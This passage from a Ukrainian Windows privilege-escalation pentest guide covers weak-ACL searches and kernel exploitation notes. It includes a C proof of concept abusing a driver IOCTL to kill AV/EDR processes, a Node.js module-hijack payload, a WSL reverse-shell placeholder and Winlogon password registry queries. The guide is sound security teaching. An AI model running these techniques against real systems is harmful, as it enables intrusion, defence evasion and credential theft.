У NTFS доступний для читання файл може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликої кількості відповідних доступних резервних копій або файлів конфігурації перевірте **назви й розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка. Перевірте фактичний доступ на читання до файлу, підтримку потоків файловою системою, наявність у потоці придатних до використання облікових даних і обліковий запис, від імені якого вони справді проходять автентифікацію. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли помічника Windows Driver Kit, що запускається за розкладом

До складу необов’язкового Windows Driver Kit входить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` зі свого каталогу запуску. Заплановане завдання або служба, що запускає цей помічник із привілейованим обліковим записом, може перетворити доступ із низькими привілеями на запис до цих вхідних файлів на виконання команд у контексті цього облікового запису, навіть якщо сам виконуваний файл захищений. Переконайтеся, що споживач має привілеї, а **обидва** допоміжні файли можна створити або змінити; самого виявлення помічника недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL двох допоміжних шляхів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу — лише зачіпка, яку треба перевірити, а не доказ того, звідки завдання читає вхідні файли. Також має бути виконана передумова щодо робочого файлу проєкту. Перевірте фактичний обліковий запис завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Застосунки

### Встановлені застосунки

Перевірте **дозволи для бінарних файлів** (можливо, один із них можна перезаписати й підвищити привілеї) та **папок** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім запускали наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник усунув проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень виправлень установленої версії та можливість виконання вразливої операції агента; позначення лише гілки, наприклад `2.1`, не дає змоги визначити наявність вразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх; постачальник усунув її у збірці 6211. Вона має значення лише тоді, коли SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт або шлях до служби — це підказка, а не висновок про вразливість: перевірте точну збірку, історію конфігурації SAML, мережеву доступність служби та обліковий запис, від імені якого вона працює. Виконання коду через службу успадковує привілеї цього облікового запису; для виконання від імені SYSTEM потрібен екземпляр, запущений від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема підказка щодо зашифрованої резервної копії, а не доказ наявності доступних облікових даних чи цієї вразливості SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі контролера Jenkins і облікового запису домену

На контролері Jenkins під Windows розрізняйте дозвіл на створення або налаштування завдання та дозвіл на його запуск: [у документації Jenkins ці права наведено окремо як `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер може забезпечити інший спосіб запуску збірки, але перевірте, що він увімкнений і збірка справді виконується. Код запускається від імені контролера або вибраного агента, а збережені облікові дані можна використати лише тоді, коли завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає облікові дані та ключі шифрування у `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама наявність цих файлів не розкриває пароль; перевірте **доступ для читання до потрібних файлів** і окремий шлях повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, перевірте наявність доступного для запису шляху до скрипту та реального процесу входу в систему або запланованого завдання, яке його запускає від імені цільового користувача, перш ніж вважати це виконанням між користувачами. Для подальшого контролю групи потрібно окремо підтвердити ефективні права AD.

#### Ідентичність self-hosted агента Azure Pipelines

Для проєкту Azure DevOps Server або Azure Pipelines розділяйте дозвіл на **створення або редагування** конвеєра, дозвіл на його **постановку в чергу** та дозвіл на використання вибраного пулу агентів; [Microsoft окремо описує дозволи конвеєра](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може передати крок зі скриптом і запустити цей конвеєр на self-hosted агенті Windows, крок виконується від імені [налаштованого облікового запису операційної системи агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між користувачами або перехід до SYSTEM, перевірте конкретний конвеєр, обмеження гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентичність служби агента. Установлений агент, роль у проєкті або право запису в репозиторій самі по собі є лише підказками; під час пасивного переліку перевіряйте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який отримує доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, дозволи якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Сама наявність служби синхронізації, групи з назвою, що натякає на права локального адміністратора, або видимості бази даних не доводить, що облікові дані можна розшифрувати чи підвищити привілеї в домені. Окремо перевірте фактичні права читання бази даних, доступ служби та ключів, структуру встановлення й SQL, налаштовану ідентичність конектора та ефективні привілеї цієї ідентичності в AD. Під час звичайного переліку показуйте лише метадані служби та доступу, не виконуйте запити до збережених секретів і не виводьте їх.

#### Дозволи на DLL підтримки драйвера принтера

Установлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованіший процес друку. Перевірте ACL конкретного каталогу драйвера та DLL, включно з батьківськими каталогами й точками повторного аналізу, навіть якщо доступ до переліку принтерів через WMI заборонено. У випадку [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [первинний опис](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описує завантаження DLL через `PrintIsolationHost.exe`. ACL із правом запису — лише підказка: перевірте фактичний доступ на запис з урахуванням заборонних записів, чи встановлено відповідний драйвер і чи завантажує він файл від імені привілейованої ідентичності, а також чи виправлено встановлення оновленим драйвером або засобом безпеки постачальника. Не робіть висновок про вразливість лише за назвою каталогу або версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити файл конфігурації, щоб прочитати спеціальний файл, або змінити двійковий файл, який буде запущено від імені облікового запису адміністратора (schedtasks).

Щоб знайти в системі каталоги або файли зі слабкими дозволами, виконайте:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/виконання через автозавантаження плагінів Notepad++

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступне портативне/копійоване встановлення з правом запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете перезаписати якийсь елемент реєстру або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **місця автозапуску для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Пошукайте можливі **дивні/вразливі драйвери сторонніх виробників**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в kernel (поширена проблема в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із пам’яті kernel.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Пов’язані матеріали про експлуатацію kernel Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для race-condition багів, коли вразливий виклик відкриває шлях Object Manager, контрольований атакувальником, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF у cancel-safe queue, розкриття даних із paged pool та pivots через I/O ring

Деякі ланцюжки LPE у kernel Windows можна побудувати на основі двох окремо слабких багів: **race condition життєвого циклу cancel-safe queue**, що звільняє запит/CBD, поки блокування черги ще утримується, та розкриття даних через **lock-release-before-copy**, яке зливає звільнений блок пам’яті paged pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту й експлуатації:

- **Free-under-lock + cancel afterwards**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання викликає `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до зняття блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом відновити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback драйвера для видалення.
- **Повторно займіть звільнений об’єкт черги** алокацією paged pool такого самого розміру, контрольованою атакувальником. Елементи Data Queue Entries у `NPFS` корисні, оскільки їхні payload і розмір можна контролювати, а згодом — досліджувати операціями читання/перегляду pipe. Якщо звільнений об’єкт містить посилання списку, перезапишіть їх **циклічним списком фальшивих вузлів запитів у пам’яті user mode**, щоб драйвер знову й знову обробляв визначені атакувальником структури запитів, а не зупинявся на початковій голові списку.
- **Розширте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується записами обліку (часові мітки / QPC / поля поруч із лічильником посилань), можна отримати запис у kernel з **контрольованою адресою, але неконтрольованим значенням**. У такому разі націльтеся на поле **length/size** об’єкта розпиленого pool, а не на кінцевий вказівник на код/дані, а потім перебирайте об’єкти розпилення, доки пошкоджений об’єкт не забезпечить **читання paged pool за межами буфера**.
- **Шаблон розкриття даних, який можна використати в race condition**: будь-який syscall із послідовністю `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` — перспективний кандидат. Надійність зростає, коли атакувальник може збільшити копійований буфер (наприклад, додавши багато елементів списку/ресурсів, які збільшують остаточний розмір алокації серіалізатора), оскільки довше копіювання розширює вікно заміни, не обов’язково спричиняючи збій системи.
- **Цілі для поповнення, що містять багато вказівників**: зареєстровані масиви буферів **I/O ring** у Windows — чудові цілі для розкриття даних, оскільки їхній розмір paged pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент — це вказівник kernel на `_IOP_MC_BUFFER_ENTRY`. Злийте один із цих масивів, відновіть навколишній `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником елементи й забезпечили довільне читання/запис у kernel. Якщо доступний лише запис, що задає стабільний байт (наприклад, з `KUSER_SHARED_DATA+0x14`), використайте **перекривні невирівняні записи**, щоб сформувати повторюваний байтовий вказівник user mode, наприклад `0x0101010101010101`, відобразіть його через `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис у ядрі через пошкоджене кільце I/O, викрадіть токен SYSTEM за допомогою стандартного процесу після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті вулика реєстру

Сучасні вразливості вуликів реєстру дають змогу формувати детерміновані розкладки пам’яті, зловживати доступними для запису дочірніми ключами HKLM/HKU та перетворювати пошкодження метаданих на переповнення paged pool ядра без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct функції `RtlQueryRegistryValues` через шляхи, контрольовані зловмисником

Деякі драйвери приймають шлях до реєстру з простору користувача, перевіряють лише, чи є він коректним рядком UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи вказівник на скаляр у стеку, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до типу, якого очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Заплутаний посередник / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу звертатися до вибраних зловмисником ключів, виявляти їх існування через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: призначення для скаляра, наприклад `&readValue`, може інтерпретуватися з неправильним типом як `REG_QWORD`, `UNICODE_STRING` або буфер заданого розміру — залежно від типу значення реєстру.

Практичні нотатки щодо експлуатації:

- **Захист у Windows 8 і новіших версіях**: якщо запит звертається до **недовіреного вулика** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні зловмиснику для запису ключі в довірених системних вуликах**, а не розміщуйте значення в `HKCU`.
- **Розміщення даних у довіреному вулику**: використовуйте NtObjectManager, щоб перелічити доступні для запису дочірні ключі в `\Registry\Machine`, а потім повторіть сканування з дубльованим токеном **низького рівня цілісності**, щоб знайти ключі, доступні з ізольованих контекстів:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека й може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, отримуючи частково контрольований запис у ядро.
- **`REG_BINARY`**: для великих двійкових даних direct mode трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі контрольоване атакувальником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо поверх сусідніх слотів стека — це часто найпростіший шлях до повного перезапису callback pointer.

Надійна ознака для пошуку: **читання різнотипних значень реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, де перше читання реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + EDR kill)

Деякі підписані драйвери сторонніх виробників створюють об’єкт пристрою з надійним SDDL за допомогою IoCreateDeviceSecure, але забувають задати FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом. Унаслідок цього будь-який непривілейований користувач може отримати дескриптор, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, виявлених у реальних умовах:
- Повернення дескрипторів із повним доступом до довільних процесів (викрадення токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис необроблених даних диска (втручання в систему поза мережею, трюки зі збереженням присутності під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу зупиняти AV/EDR із режиму користувача через ядро.

Мінімальний шаблон PoC (режим користувача):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи пом’якшення для розробників
- Завжди задавайте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте brokered models замість надання прямих привілеїв ядра.

Ідеї для виявлення
- Відстежуйте відкриття підозрілих імен пристроїв у user mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих уразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволених/заборонених драйверів.


## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис до папки, що входить до PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку Windows**, який впливає на застосунки **Node.js** та **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож застосунок, запущений із `C:\Users\Administrator\project\app.js`, може перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або каталог пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо ціль запускається від імені адміністратора, із підвищеного завдання планувальника чи обгортки служби або як привілейований застосунок робочого столу, що запускається автоматично.

Таке особливо часто трапляється, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека викликає `require("foo")` усередині `try/catch` і продовжує роботу після помилки
- пакет видалили зі збірок для production, не включили під час пакування або не вдалося встановити
- вразливий виклик `require()` міститься глибоко в дереві залежностей, а не в коді основного застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Установіть фільтр `Process Name` = цільовий виконуваний файл (`node.exe`, EXE-файл застосунку Electron або процес-обгортка)
- Установіть фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття шляху в `C:\node_modules`

Корисні шаблони для перевірки коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або перегляду вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть програму-жертву. Якщо програма викликає `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але повторно використовуваною є сама **техніка**: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron намагатиметься знайти.

### Ідеї для виявлення та посилення захисту

- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові файли чи пакети `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів на кшталт `try { require("...") } catch {}`, які не повідомляють про помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate`, встановивши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не вказані в файлі hosts інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте наявність **обмежених служб** ззовні.

```bash
netstat -ano #Opened ports?
```

Для локального прослуховувача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою чи запланованим завданням, які його запускають. Служба віддаленого керування може надати доступ від імені свого користувача робочого столу, лише якщо це дозволяють її автентифікація та засоби керування командами. Спеціальна TCP-програма, запущена від імені облікового запису з вищими привілеями, потребує окремої перевірки: прослуховувач і шлях до бінарного файла — лише пасивні підказки, тоді як для підтвердження можливості експлуатації пошкодження пам’яті через автентифікований доступ потрібно проаналізувати саме цей бінарний файл і доступний для нього ввід. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, порівняйте його з результатом команди [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило переадресації не доводить, що ціль доступна або вразлива.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку з командами для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше [команд для переліку мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, зможете прослуховувати будь-який порт (під час першої спроби прослуховувати порт за допомогою `nc.exe` у графічному вікні з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі доступ `root` у Linux усередині WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows має доступ на читання до файлової системи дистрибутива, перевірте файли історії команд оболонки, зокрема `/root/.bash_history`, на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` характерна для старіших інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спершу визначте фактичний дистрибутив і шлях до його сховища. Уникайте виведення вмісту історії під час автоматизованого переліку.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді неможливо прочитати, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Диспетчер облікових даних / Windows Vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і налаштувати автоматичний вхід у браузерах, але це працює не так.

